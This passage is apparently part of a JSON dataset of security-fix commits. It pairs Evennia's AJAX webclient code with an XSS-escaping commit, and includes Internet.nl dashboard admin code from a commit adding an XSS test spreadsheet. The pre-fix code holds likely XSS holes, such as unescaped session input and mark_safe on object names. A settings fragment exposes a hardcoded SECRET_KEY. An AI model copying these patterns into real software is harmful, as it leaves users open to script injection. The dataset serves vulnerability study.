raw=options.get(\"raw\", flags.get(\"RAW\", False)) xterm256=options.get(\"xterm256\", flags.get('XTERM256', True)) useansi=options.get(\"ansi\", flags.get('ANSI', True)) nocolor=options.get(\"nocolor\", flags.get(\"NOCOLOR\") or not(xterm256 or useansi)) screenreader=options.get(\"screenreader\", flags.get(\"SCREENREADER\", False)) prompt=options.get(\"send_prompt\", False) if screenreader: text=parse_ansi(text, strip_ansi=True, xterm256=False, mxp=False) text=_RE_SCREENREADER_REGEX.sub(\"\", text) cmd=\"prompt\" if prompt else \"text\" if raw: args[0]=text else: args[0]=parse_html(text, strip_ansi=nocolor) self.client.lineSend(self.csessid,[cmd, args, kwargs]) def send_prompt(self, *args, **kwargs): kwargs[\"options\"].update({\"send_prompt\": True}) self.send_text(*args, **kwargs) def send_default(self, cmdname, *args, **kwargs): \"\"\" Data Evennia -> User. Args: cmdname(str): The first argument will always be the oob cmd name. *args(any): Remaining args will be arguments for `cmd`. Kwargs: options(dict): These are ignored for oob commands. Use command arguments(which can hold dicts) to send instructions to the client instead. \"\"\" if not cmdname==\"options\": self.client.lineSend(self.csessid,[cmdname, args, kwargs]) ", "sourceWithComments": "\"\"\"\nAJAX/COMET fallback webclient\n\nThe AJAX/COMET web client consists of two components running on\ntwisted and django. They are both a part of the Evennia website url\ntree (so the testing website might be located on\nhttp://localhost:4001/, whereas the webclient can be found on\nhttp://localhost:4001/webclient.)\n\n/webclient - this url is handled through django's template\n             system and serves the html page for the client\n             itself along with its javascript chat program.\n/webclientdata - this url is called by the ajax chat using\n                 POST requests (long-polling when necessary)\n                 The WebClient resource in this module will\n                 handle these requests and act as a gateway\n                 to sessions connected over the webclient.\n\"\"\"\nimport json\nimport re\nimport time\n\nfrom twisted.web import server, resource\nfrom twisted.internet.task import LoopingCall\nfrom django.utils.functional import Promise\nfrom django.utils.encoding import force_unicode\nfrom django.conf import settings\nfrom evennia.utils.ansi import parse_ansi\nfrom evennia.utils import utils\nfrom evennia.utils.text2html import parse_html\nfrom evennia.server import session\n\n_CLIENT_SESSIONS = utils.mod_import(settings.SESSION_ENGINE).SessionStore\n_RE_SCREENREADER_REGEX = re.compile(r\"%s\" % settings.SCREENREADER_REGEX_STRIP, re.DOTALL + re.MULTILINE)\n_SERVERNAME = settings.SERVERNAME\n_KEEPALIVE = 30  # how often to check keepalive\n\n# defining a simple json encoder for returning\n# django data to the client. Might need to\n# extend this if one wants to send more\n# complex database objects too.\n\n\nclass LazyEncoder(json.JSONEncoder):\n    def default(self, obj):\n        if isinstance(obj, Promise):\n            return force_unicode(obj)\n        return super(LazyEncoder, self).default(obj)\n\n\ndef jsonify(obj):\n    return utils.to_str(json.dumps(obj, ensure_ascii=False, cls=LazyEncoder))\n\n\n#\n# AjaxWebClient resource - this is called by the ajax client\n# using POST requests to /webclientdata.\n#\n\nclass AjaxWebClient(resource.Resource):\n    \"\"\"\n    An ajax/comet long-polling transport\n\n    \"\"\"\n    isLeaf = True\n    allowedMethods = ('POST',)\n\n    def __init__(self):\n        self.requests = {}\n        self.databuffer = {}\n\n        self.last_alive = {}\n        self.keep_alive = None\n\n    def _responseFailed(self, failure, csessid, request):\n        \"callback if a request is lost/timed out\"\n        try:\n            del self.requests[csessid]\n        except KeyError:\n            # nothing left to delete\n            pass\n\n    def _keepalive(self):\n        \"\"\"\n        Callback for checking the connection is still alive.\n        \"\"\"\n        now = time.time()\n        to_remove = []\n        keep_alives = ((csessid, remove) for csessid, (t, remove)\n                       in self.last_alive.iteritems() if now - t > _KEEPALIVE)\n        for csessid, remove in keep_alives:\n            if remove:\n                # keepalive timeout. Line is dead.\n                to_remove.append(csessid)\n            else:\n                # normal timeout - send keepalive\n                self.last_alive[csessid] = (now, True)\n                self.lineSend(csessid, [\"ajax_keepalive\", [], {}])\n        # remove timed-out sessions\n        for csessid in to_remove:\n            sessions = self.sessionhandler.sessions_from_csessid(csessid)\n            for sess in sessions:\n                sess.disconnect()\n            self.last_alive.pop(csessid, None)\n            if not self.last_alive:\n                # no more ajax clients. Stop the keepalive\n                self.keep_alive.stop()\n                self.keep_alive = None\n\n    def at_login(self):\n        \"\"\"\n        Called when this session gets authenticated by the server.\n        \"\"\"\n        pass\n\n    def lineSend(self, csessid, data):\n        \"\"\"\n        This adds the data to the buffer and/or sends it to the client\n        as soon as possible.\n\n        Args:\n            csessid (int): Session id.\n            data (list): A send structure [cmdname, [args], {kwargs}].\n\n        \"\"\"\n        request = self.requests.get(csessid)\n        if request:\n            # we have a request waiting. Return immediately.\n            request.write(jsonify(data))\n            request.finish()\n            del self.requests[csessid]\n        else:\n            # no waiting request. Store data in buffer\n            dataentries = self.databuffer.get(csessid, [])\n            dataentries.append(jsonify(data))\n            self.databuffer[csessid] = dataentries\n\n    def client_disconnect(self, csessid):\n        \"\"\"\n        Disconnect session with given csessid.\n\n        Args:\n            csessid (int): Session id.\n\n        \"\"\"\n        if csessid in self.requests:\n            self.requests[csessid].finish()\n            del self.requests[csessid]\n        if csessid in self.databuffer:\n            del self.databuffer[csessid]\n\n    def mode_init(self, request):\n        \"\"\"\n        This is called by render_POST when the client requests an init\n        mode operation (at startup)\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        csessid = request.args.get('csessid')[0]\n\n        remote_addr = request.getClientIP()\n        host_string = \"%s (%s:%s)\" % (_SERVERNAME, request.getRequestHostname(), request.getHost().port)\n\n        sess = AjaxWebClientSession()\n        sess.client = self\n        sess.init_session(\"ajax/comet\", remote_addr, self.sessionhandler)\n\n        sess.csessid = csessid\n        csession = _CLIENT_SESSIONS(session_key=sess.csessid)\n        uid = csession and csession.get(\"webclient_authenticated_uid\", False)\n        if uid:\n            # the client session is already logged in\n            sess.uid = uid\n            sess.logged_in = True\n\n        sess.sessionhandler.connect(sess)\n\n        self.last_alive[csessid] = (time.time(), False)\n        if not self.keep_alive:\n            # the keepalive is not running; start it.\n            self.keep_alive = LoopingCall(self._keepalive)\n            self.keep_alive.start(_KEEPALIVE, now=False)\n\n        return jsonify({'msg': host_string, 'csessid': csessid})\n\n    def mode_keepalive(self, request):\n        \"\"\"\n        This is called by render_POST when the\n        client is replying to the keepalive.\n        \"\"\"\n        csessid = request.args.get('csessid')[0]\n        self.last_alive[csessid] = (time.time(), False)\n        return '\"\"'\n\n    def mode_input(self, request):\n        \"\"\"\n        This is called by render_POST when the client\n        is sending data to the server.\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        csessid = request.args.get('csessid')[0]\n\n        self.last_alive[csessid] = (time.time(), False)\n        sess = self.sessionhandler.sessions_from_csessid(csessid)\n        if sess:\n            sess = sess[0]\n            cmdarray = json.loads(request.args.get('data')[0])\n            sess.sessionhandler.data_in(sess, **{cmdarray[0]: [cmdarray[1], cmdarray[2]]})\n        return '\"\"'\n\n    def mode_receive(self, request):\n        \"\"\"\n        This is called by render_POST when the client is telling us\n        that it is ready to receive data as soon as it is available.\n        This is the basis of a long-polling (comet) mechanism: the\n        server will wait to reply until data is available.\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        csessid = request.args.get('csessid')[0]\n        self.last_alive[csessid] = (time.time(), False)\n\n        dataentries = self.databuffer.get(csessid, [])\n        if dataentries:\n            return dataentries.pop(0)\n        request.notifyFinish().addErrback(self._responseFailed, csessid, request)\n        if csessid in self.requests:\n            self.requests[csessid].finish()  # Clear any stale request.\n        self.requests[csessid] = request\n        return server.NOT_DONE_YET\n\n    def mode_close(self, request):\n        \"\"\"\n        This is called by render_POST when the client is signalling\n        that it is about to be closed.\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        csessid = request.args.get('csessid')[0]\n        try:\n            sess = self.sessionhandler.sessions_from_csessid(csessid)[0]\n            sess.sessionhandler.disconnect(sess)\n        except IndexError:\n            self.client_disconnect(csessid)\n        return '\"\"'\n\n    def render_POST(self, request):\n        \"\"\"\n        This function is what Twisted calls with POST requests coming\n        in from the ajax client. The requests should be tagged with\n        different modes depending on what needs to be done, such as\n        initializing or sending/receving data through the request. It\n        uses a long-polling mechanism to avoid sending data unless\n        there is actual data available.\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        dmode = request.args.get('mode', [None])[0]\n        if dmode == 'init':\n            # startup. Setup the server.\n            return self.mode_init(request)\n        elif dmode == 'input':\n            # input from the client to the server\n            return self.mode_input(request)\n        elif dmode == 'receive':\n            # the client is waiting to receive data.\n            return self.mode_receive(request)\n        elif dmode == 'close':\n            # the client is closing\n            return self.mode_close(request)\n        elif dmode == 'keepalive':\n            # A reply to our keepalive request - all is well\n            return self.mode_keepalive(request)\n        else:\n            # This should not happen if client sends valid data.\n            return '\"\"'\n\n\n#\n# A session type handling communication over the\n# web client interface.\n#\n\nclass AjaxWebClientSession(session.Session):\n    \"\"\"\n    This represents a session running in an AjaxWebclient.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        self.protocol_key = \"webclient/ajax\"\n        super(AjaxWebClientSession, self).__init__(*args, **kwargs)\n\n    def get_client_session(self):\n        \"\"\"\n        Get the Client browser session (used for auto-login based on browser session)\n\n        Returns:\n            csession (ClientSession): This is a django-specific internal representation\n                of the browser session.\n\n        \"\"\"\n        if self.csessid:\n            return _CLIENT_SESSIONS(session_key=self.csessid)\n\n    def disconnect(self, reason=\"Server disconnected.\"):\n        \"\"\"\n        Disconnect from server.\n\n        Args:\n            reason (str): Motivation for the disconnect.\n        \"\"\"\n        csession = self.get_client_session()\n\n        if csession:\n            csession[\"webclient_authenticated_uid\"] = None\n            csession.save()\n            self.logged_in = False\n        self.client.lineSend(self.csessid, [\"connection_close\", [reason], {}])\n        self.client.client_disconnect(self.csessid)\n        self.sessionhandler.disconnect(self)\n\n    def at_login(self):\n        csession = self.get_client_session()\n        if csession:\n            csession[\"webclient_authenticated_uid\"] = self.uid\n            csession.save()\n\n    def data_out(self, **kwargs):\n        \"\"\"\n        Data Evennia -> User\n\n        Kwargs:\n            kwargs (any): Options to the protocol\n        \"\"\"\n        self.sessionhandler.data_out(self, **kwargs)\n\n    def send_text(self, *args, **kwargs):\n        \"\"\"\n        Send text data. This will pre-process the text for\n        color-replacement, conversion to html etc.\n\n        Args:\n            text (str): Text to send.\n\n        Kwargs:\n            options (dict): Options-dict with the following keys understood:\n                - raw (bool): No parsing at all (leave ansi-to-html markers unparsed).\n                - nocolor (bool): Remove all color.\n                - screenreader (bool): Use Screenreader mode.\n                - send_prompt (bool): Send a prompt with parsed html\n\n        \"\"\"\n        if args:\n            args = list(args)\n            text = args[0]\n            if text is None:\n                return\n        else:\n            return\n\n        flags = self.protocol_flags\n        text = utils.to_str(text, force_string=True)\n\n        options = kwargs.pop(\"options\", {})\n        raw = options.get(\"raw\", flags.get(\"RAW\", False))\n        xterm256 = options.get(\"xterm256\", flags.get('XTERM256', True))\n        useansi = options.get(\"ansi\", flags.get('ANSI', True))\n        nocolor = options.get(\"nocolor\", flags.get(\"NOCOLOR\") or not (xterm256 or useansi))\n        screenreader = options.get(\"screenreader\", flags.get(\"SCREENREADER\", False))\n        prompt = options.get(\"send_prompt\", False)\n\n        if screenreader:\n            # screenreader mode cleans up output\n            text = parse_ansi(text, strip_ansi=True, xterm256=False, mxp=False)\n            text = _RE_SCREENREADER_REGEX.sub(\"\", text)\n        cmd = \"prompt\" if prompt else \"text\"\n        if raw:\n            args[0] = text\n        else:\n            args[0] = parse_html(text, strip_ansi=nocolor)\n\n        # send to client on required form [cmdname, args, kwargs]\n        self.client.lineSend(self.csessid, [cmd, args, kwargs])\n\n    def send_prompt(self, *args, **kwargs):\n        kwargs[\"options\"].update({\"send_prompt\": True})\n        self.send_text(*args, **kwargs)\n\n    def send_default(self, cmdname, *args, **kwargs):\n        \"\"\"\n        Data Evennia -> User.\n\n        Args:\n            cmdname (str): The first argument will always be the oob cmd name.\n            *args (any): Remaining args will be arguments for `cmd`.\n\n        Kwargs:\n            options (dict): These are ignored for oob commands. Use command\n                arguments (which can hold dicts) to send instructions to the\n                client instead.\n\n        \"\"\"\n        if not cmdname == \"options\":\n            # print \"ajax.send_default\", cmdname, args, kwargs\n            self.client.lineSend(self.csessid, [cmdname, args, kwargs])\n"}}, "msg": "Escape AJAX session input to better protect against XSS attacks. Resolve #1846"}}, "https://github.com/internetstandards/Internet.nl-dashboard": {"9c1c17e55e436e0f6a5f7271c39d77d8a6890738": {"url": "https://api.github.com/repos/internetstandards/Internet.nl-dashboard/commits/9c1c17e55e436e0f6a5f7271c39d77d8a6890738", "html_url": "https://github.com/internetstandards/Internet.nl-dashboard/commit/9c1c17e55e436e0f6a5f7271c39d77d8a6890738", "message": "Add spreadsheet with XSS attacks, icon to dashboard and status to upload in admin", "sha": "9c1c17e55e436e0f6a5f7271c39d77d8a6890738", "keyword": "XSS attack", "diff": "diff --git a/dashboard/internet_nl_dashboard/admin.py b/dashboard/internet_nl_dashboard/admin.py\nindex 2f7ceb2..36d6c23 100644\n--- a/dashboard/internet_nl_dashboard/admin.py\n+++ b/dashboard/internet_nl_dashboard/admin.py\n@@ -216,8 +216,8 @@ class UrlListAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n \n @admin.register(UploadLog)\n class UploadLogAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n-    list_display = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')\n-    search_fields = ('internal_filename', 'orginal_filename', 'message')\n+    list_display = ('original_filename', 'internal_filename', 'status', 'message', 'user', 'upload_date', 'filesize')\n+    search_fields = ('internal_filename', 'orginal_filename', 'status')\n     list_filter = ['message', 'upload_date', 'user'][::-1]\n \n-    fields = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')\n+    fields = ('original_filename', 'internal_filename', 'status', 'message', 'user', 'upload_date', 'filesize')\ndiff --git a/dashboard/settings.py b/dashboard/settings.py\nindex e84878f..949ad5b 100644\n--- a/dashboard/settings.py\n+++ b/dashboard/settings.py\n@@ -219,13 +219,13 @@\n \n JET_SIDE_MENU_ITEMS = [\n \n-    {'label': _('\ud83d\udd27 Configuration'), 'items': [\n+    {'label': _('\ud83c\udf9b\ufe0f Configuration'), 'items': [\n         {'name': 'auth.user'},\n         {'name': 'auth.group'},\n         {'name': 'constance.config', 'label': _('Configuration')},\n     ]},\n \n-    {'label': _('Dashboard'), 'items': [\n+    {'label': _('\ud83d\udcca Dashboard'), 'items': [\n         {'name': 'internet_nl_dashboard.account'},\n         {'name': 'internet_nl_dashboard.urllist'},\n         {'name': 'internet_nl_dashboard.uploadlog'},\ndiff --git a/tests/test spreadsheet uploads/xss.ods b/tests/test spreadsheet uploads/xss.ods\nnew file mode 100644\nindex 0000000..8a5b7d4\nBinary files /dev/null and b/tests/test spreadsheet uploads/xss.ods differ\n", "files": {"/dashboard/internet_nl_dashboard/admin.py": {"changes": [{"diff": "\n \n @admin.register(UploadLog)\n class UploadLogAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n-    list_display = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')\n-    search_fields = ('internal_filename', 'orginal_filename', 'message')\n+    list_display = ('original_filename', 'internal_filename', 'status', 'message', 'user', 'upload_date', 'filesize')\n+    search_fields = ('internal_filename', 'orginal_filename', 'status')\n     list_filter = ['message', 'upload_date', 'user'][::-1]\n \n-    fields = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')\n+    fields = ('original_filename', 'internal_filename', 'status', 'message', 'user', 'upload_date', 'filesize')", "add": 3, "remove": 3, "filename": "/dashboard/internet_nl_dashboard/admin.py", "badparts": ["    list_display = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')", "    search_fields = ('internal_filename', 'orginal_filename', 'message')", "    fields = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')"], "goodparts": ["    list_display = ('original_filename', 'internal_filename', 'status', 'message', 'user', 'upload_date', 'filesize')", "    search_fields = ('internal_filename', 'orginal_filename', 'status')", "    fields = ('original_filename', 'internal_filename', 'status', 'message', 'user', 'upload_date', 'filesize')"]}], "source": "\nfrom datetime import datetime, timedelta import pytz from constance.admin import Config, ConstanceAdmin, ConstanceForm from cryptography.fernet import Fernet from django.conf import settings from django.contrib import admin from django.contrib.auth.admin import GroupAdmin as BaseGroupAdmin from django.contrib.auth.admin import UserAdmin as BaseUserAdmin from django.contrib.auth.models import Group, User from django.contrib.humanize.templatetags.humanize import naturaltime from django.utils.safestring import mark_safe from django_celery_beat.admin import PeriodicTaskAdmin, PeriodicTaskForm from django_celery_beat.models import CrontabSchedule, PeriodicTask from import_export import resources from import_export.admin import ImportExportModelAdmin from dashboard.internet_nl_dashboard.models import Account, DashboardUser, UploadLog, UrlList class MyPeriodicTaskForm(PeriodicTaskForm): fieldsets=PeriodicTaskAdmin.fieldsets \"\"\" Interval schedule does not support due_ or something. Which is absolutely terrible and vague. I can't understand why there is not an is_due() for each type of schedule. This makes it very hazy when something will run. Because of this, we'll move to the horrifically designed absolute nightmare format Crontab. Crontab would be half-great if the parameters where named. Get your crontab guru going, this is the only way you'll understand what you're doing. https://crontab.guru/ \"\"\" def clean(self): print('cleaning') cleaned_data=super(PeriodicTaskForm, self).clean() return cleaned_data class IEPeriodicTaskAdmin(PeriodicTaskAdmin, ImportExportModelAdmin): list_display=('name_safe', 'enabled', 'interval', 'crontab', 'next', 'due', 'precise', 'last_run_at', 'queue', 'task', 'args', 'last_run', 'runs') list_filter=('enabled', 'queue', 'crontab') search_fields=('name', 'queue', 'args') form=MyPeriodicTaskForm save_as=True @staticmethod def name_safe(obj): return mark_safe(obj.name) @staticmethod def last_run(obj): return obj.last_run_at @staticmethod def runs(obj): return obj.total_run_count @staticmethod def due(obj): if obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: z, y=obj.schedule.is_due(last_run_at=datetime.now(pytz.utc)) date=datetime.now(pytz.utc) +timedelta(seconds=y) return naturaltime(date) @staticmethod def precise(obj): if obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: return obj.schedule.remaining_estimate(last_run_at=datetime.now(pytz.utc)) @staticmethod def next(obj): if obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: z, y=obj.schedule.is_due(last_run_at=datetime.now(pytz.utc)) date=datetime.now(pytz.utc) +timedelta(seconds=y) return date class Meta: ordering=[\"-name\"] class IECrontabSchedule(ImportExportModelAdmin): pass admin.site.unregister(PeriodicTask) admin.site.unregister(CrontabSchedule) admin.site.register(PeriodicTask, IEPeriodicTaskAdmin) admin.site.register(CrontabSchedule, IECrontabSchedule) class DashboardUserInline(admin.StackedInline): model=DashboardUser can_delete=False verbose_name_plural='Dashboard Users' class UserResource(resources.ModelResource): class Meta: model=User class GroupResource(resources.ModelResource): class Meta: model=Group class UserAdmin(BaseUserAdmin, ImportExportModelAdmin): resource_class=UserResource inlines=(DashboardUserInline,) list_display=('username', 'first_name', 'last_name', 'email', 'is_active', 'is_staff', 'is_superuser', 'last_login', 'in_groups') actions=[] @staticmethod def in_groups(obj): value=\"\" for group in obj.groups.all(): value +=group.name return value class GroupAdmin(BaseGroupAdmin, ImportExportModelAdmin): resource_class=GroupResource admin.site.unregister(User) admin.site.register(User, UserAdmin) admin.site.unregister(Group) admin.site.register(Group, GroupAdmin) class CustomConfigForm(ConstanceForm): def __init__(self, *args, **kwargs): super(CustomConfigForm, self).__init__(*args, **kwargs) class ConfigAdmin(ConstanceAdmin): change_list_form=CustomConfigForm change_list_template='admin/config/settings.html' admin.site.unregister([Config]) admin.site.register([Config], ConfigAdmin) @admin.register(Account) class AccountAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('name', 'enable_logins', 'internet_nl_api_username') search_fields=('name',) list_filter=['enable_logins'][::-1] fields=('name', 'enable_logins', 'internet_nl_api_username', 'internet_nl_api_password') def save_model(self, request, obj, form, change): if 'internet_nl_api_password' in form.changed_data: f=Fernet(settings.FIELD_ENCRYPTION_KEY) encrypted=f.encrypt(obj.internet_nl_api_password.encode()) obj.internet_nl_api_password=encrypted super().save_model(request, obj, form, change) actions=[] @admin.register(UrlList) class UrlListAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('name', 'account',) search_fields=('name', 'account__name') list_filter=['account'][::-1] fields=('name', 'account', 'urls') @admin.register(UploadLog) class UploadLogAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize') search_fields=('internal_filename', 'orginal_filename', 'message') list_filter=['message', 'upload_date', 'user'][::-1] fields=('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize') ", "sourceWithComments": "from datetime import datetime, timedelta\n\nimport pytz\nfrom constance.admin import Config, ConstanceAdmin, ConstanceForm\nfrom cryptography.fernet import Fernet\nfrom django.conf import settings\nfrom django.contrib import admin\nfrom django.contrib.auth.admin import GroupAdmin as BaseGroupAdmin\nfrom django.contrib.auth.admin import UserAdmin as BaseUserAdmin\nfrom django.contrib.auth.models import Group, User\nfrom django.contrib.humanize.templatetags.humanize import naturaltime\nfrom django.utils.safestring import mark_safe\nfrom django_celery_beat.admin import PeriodicTaskAdmin, PeriodicTaskForm\nfrom django_celery_beat.models import CrontabSchedule, PeriodicTask\nfrom import_export import resources\nfrom import_export.admin import ImportExportModelAdmin\n\nfrom dashboard.internet_nl_dashboard.models import Account, DashboardUser, UploadLog, UrlList\n\n\nclass MyPeriodicTaskForm(PeriodicTaskForm):\n\n    fieldsets = PeriodicTaskAdmin.fieldsets\n\n    \"\"\"\n    Interval schedule does not support due_ or something. Which is absolutely terrible and vague.\n    I can't understand why there is not an is_due() for each type of schedule. This makes it very hazy\n    when something will run.\n\n    Because of this, we'll move to the horrifically designed absolute nightmare format Crontab.\n    Crontab would be half-great if the parameters where named.\n\n    Get your crontab guru going, this is the only way you'll understand what you're doing.\n    https://crontab.guru/#0_21_*_*_*\n    \"\"\"\n\n    def clean(self):\n        print('cleaning')\n\n        cleaned_data = super(PeriodicTaskForm, self).clean()\n\n        # if not self.cleaned_data['last_run_at']:\n        #     self.cleaned_data['last_run_at'] = datetime.now(pytz.utc)\n\n        return cleaned_data\n\n\nclass IEPeriodicTaskAdmin(PeriodicTaskAdmin, ImportExportModelAdmin):\n    # most / all time schedule functions in celery beat are moot. So the code below likely makes no sense.\n\n    list_display = ('name_safe', 'enabled', 'interval', 'crontab', 'next',  'due',\n                    'precise', 'last_run_at', 'queue', 'task', 'args', 'last_run', 'runs')\n\n    list_filter = ('enabled', 'queue', 'crontab')\n\n    search_fields = ('name', 'queue', 'args')\n\n    form = MyPeriodicTaskForm\n\n    save_as = True\n\n    @staticmethod\n    def name_safe(obj):\n        return mark_safe(obj.name)\n\n    @staticmethod\n    def last_run(obj):\n        return obj.last_run_at\n\n    @staticmethod\n    def runs(obj):\n        # print(dir(obj))\n        return obj.total_run_count\n\n    @staticmethod\n    def due(obj):\n        if obj.last_run_at:\n            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)\n        else:\n            # y in seconds\n            z, y = obj.schedule.is_due(last_run_at=datetime.now(pytz.utc))\n            date = datetime.now(pytz.utc) + timedelta(seconds=y)\n\n            return naturaltime(date)\n\n    @staticmethod\n    def precise(obj):\n        if obj.last_run_at:\n            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)\n        else:\n            return obj.schedule.remaining_estimate(last_run_at=datetime.now(pytz.utc))\n\n    @staticmethod\n    def next(obj):\n        if obj.last_run_at:\n            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)\n        else:\n            # y in seconds\n            z, y = obj.schedule.is_due(last_run_at=datetime.now(pytz.utc))\n            # somehow the cron jobs still give the correct countdown even last_run_at is not set.\n\n            date = datetime.now(pytz.utc) + timedelta(seconds=y)\n\n            return date\n\n    class Meta:\n        ordering = [\"-name\"]\n\n\nclass IECrontabSchedule(ImportExportModelAdmin):\n    pass\n\n\nadmin.site.unregister(PeriodicTask)\nadmin.site.unregister(CrontabSchedule)\nadmin.site.register(PeriodicTask, IEPeriodicTaskAdmin)\nadmin.site.register(CrontabSchedule, IECrontabSchedule)\n\n\nclass DashboardUserInline(admin.StackedInline):\n    model = DashboardUser\n    can_delete = False\n    verbose_name_plural = 'Dashboard Users'\n\n\n# Thank you:\n# https://stackoverflow.com/questions/47941038/how-should-i-add-django-import-export-on-the-user-model?rq=1\nclass UserResource(resources.ModelResource):\n    class Meta:\n        model = User\n        # fields = ('first_name', 'last_name', 'email')\n\n\nclass GroupResource(resources.ModelResource):\n    class Meta:\n        model = Group\n\n\nclass UserAdmin(BaseUserAdmin, ImportExportModelAdmin):\n    resource_class = UserResource\n    inlines = (DashboardUserInline, )\n\n    list_display = ('username', 'first_name', 'last_name',\n                    'email', 'is_active', 'is_staff', 'is_superuser', 'last_login', 'in_groups')\n\n    actions = []\n\n    @staticmethod\n    def in_groups(obj):\n        value = \"\"\n        for group in obj.groups.all():\n            value += group.name\n        return value\n\n\n# I don't know if the permissions between two systems have the same numbers... Only one way to find out :)\nclass GroupAdmin(BaseGroupAdmin, ImportExportModelAdmin):\n    resource_class = GroupResource\n\n\nadmin.site.unregister(User)\nadmin.site.register(User, UserAdmin)\nadmin.site.unregister(Group)\nadmin.site.register(Group, GroupAdmin)\n\n\n# todo: make sure this is implemented.\n# Overwrite the ugly Constance forms with something nicer\nclass CustomConfigForm(ConstanceForm):\n    def __init__(self, *args, **kwargs):\n        super(CustomConfigForm, self).__init__(*args, **kwargs)\n        # ... do stuff to make your settings form nice ...\n\n\nclass ConfigAdmin(ConstanceAdmin):\n    change_list_form = CustomConfigForm\n    change_list_template = 'admin/config/settings.html'\n\n\nadmin.site.unregister([Config])\nadmin.site.register([Config], ConfigAdmin)\n\n\n@admin.register(Account)\nclass AccountAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n\n    list_display = ('name', 'enable_logins', 'internet_nl_api_username')\n    search_fields = ('name', )\n    list_filter = ['enable_logins'][::-1]\n    fields = ('name', 'enable_logins', 'internet_nl_api_username', 'internet_nl_api_password')\n\n    def save_model(self, request, obj, form, change):\n\n        # If the internet_nl_api_password changed, encrypt the new value.\n        # Example usage and docs: https://github.com/pyca/cryptography\n        if 'internet_nl_api_password' in form.changed_data:\n            f = Fernet(settings.FIELD_ENCRYPTION_KEY)\n            encrypted = f.encrypt(obj.internet_nl_api_password.encode())\n            obj.internet_nl_api_password = encrypted\n\n            # You can decrypt using f.decrypt(token)\n\n        super().save_model(request, obj, form, change)\n\n    actions = []\n\n\n@admin.register(UrlList)\nclass UrlListAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n\n    list_display = ('name', 'account', )\n    search_fields = ('name', 'account__name')\n    list_filter = ['account'][::-1]\n    fields = ('name', 'account', 'urls')\n\n\n@admin.register(UploadLog)\nclass UploadLogAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n    list_display = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')\n    search_fields = ('internal_filename', 'orginal_filename', 'message')\n    list_filter = ['message', 'upload_date', 'user'][::-1]\n\n    fields = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')\n"}, "/dashboard/settings.py": {"changes": [{"diff": "\n \n JET_SIDE_MENU_ITEMS = [\n \n-    {'label': _('\ud83d\udd27 Configuration'), 'items': [\n+    {'label': _('\ud83c\udf9b\ufe0f Configuration'), 'items': [\n         {'name': 'auth.user'},\n         {'name': 'auth.group'},\n         {'name': 'constance.config', 'label': _('Configuration')},\n     ]},\n \n-    {'label': _('Dashboard'), 'items': [\n+    {'label': _('\ud83d\udcca Dashboard'), 'items': [\n         {'name': 'internet_nl_dashboard.account'},\n         {'name': 'internet_nl_dashboard.urllist'},\n         {'name': 'internet_nl_dashboard.uploadlog'}", "add": 2, "remove": 2, "filename": "/dashboard/settings.py", "badparts": ["    {'label': _('\ud83d\udd27 Configuration'), 'items': [", "    {'label': _('Dashboard'), 'items': ["], "goodparts": ["    {'label': _('\ud83c\udf9b\ufe0f Configuration'), 'items': [", "    {'label': _('\ud83d\udcca Dashboard'), 'items': ["]}], "source": "\n\"\"\" Django settings for dashboard project. Generated by 'django-admin startproject' using Django 2.1.7. For more information on this file, see https://docs.djangoproject.com/en/2.1/topics/settings/ For the full list of settings and their values, see https://docs.djangoproject.com/en/2.1/ref/settings/ \"\"\" import os from datetime import timedelta from django.utils.translation import gettext_lazy as _ BASE_DIR=os.path.dirname(os.path.abspath(__file__)) SETTINGS_PATH=os.path.normpath(os.path.dirname(__file__)) SECRET_KEY='_dzlo^9d DEBUG=True ALLOWED_HOSTS=[] INSTALLED_APPS=[ 'constance', 'constance.backends.database', 'jet.dashboard', 'jet', 'import_export', 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'django.contrib.humanize', 'django_celery_beat', 'compressor', 'websecmap.app', 'websecmap.organizations', 'websecmap.scanners', 'websecmap.reporting', 'websecmap.map', 'websecmap.pro', 'dashboard.internet_nl_dashboard', 'django_otp', 'django_otp.plugins.otp_static', 'django_otp.plugins.otp_totp', 'two_factor', ] try: if not os.environ.get('COMPRESS', False): import django_uwsgi INSTALLED_APPS +=['django_uwsgi',] except ImportError: pass MIDDLEWARE=[ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.locale.LocaleMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware', 